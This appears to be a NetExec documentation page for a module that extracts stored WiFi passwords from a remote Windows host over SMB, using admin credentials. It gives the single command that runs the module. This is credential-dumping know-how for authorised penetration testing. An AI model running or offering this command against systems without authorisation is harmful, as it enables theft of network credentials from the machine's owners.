# Dump WIFI password

Get the WIFI password register in Windows

{% hint style="warning" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

```bash
nxc smb $TARGET -u $USER -p $PASSWORD -M wifi
```
